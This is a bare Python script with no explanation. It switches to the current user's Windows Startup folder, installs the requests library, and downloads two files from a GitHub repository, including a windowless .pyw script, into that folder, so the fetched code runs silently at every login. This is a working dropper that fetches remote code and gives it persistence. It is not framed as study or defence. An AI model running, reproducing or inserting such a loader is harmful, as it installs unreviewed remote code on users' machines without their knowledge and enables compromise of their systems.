import os
import sys
import subprocess


USERNAME = os.environ['USERNAME']
PATH = rf"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

setup = "https://raw.githubusercontent.com/lamer34/lamer_code/master/setup.pyw"  # SETUP FILES
task = "https://raw.githubusercontent.com/lamer34/lamer_code/master/tasks.py"  # TASK FILES


def install_modules():
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', 'requests'])

    print("requests succesfully installed!")


def get_codes(URL):

    try:
        import requests

        r = requests.get(URL)
        file_name = URL.split("/")[-1]

        if r.ok:
            with open(f"{file_name}", "w") as w:
                w.write(r.text)
    except:
        install_modules()
        pass


def main():

    os.chdir(PATH)
    install_modules()

    urls = [setup, task]
    for url in urls:
        get_codes(url)


if __name__ == "__main__":
    main()
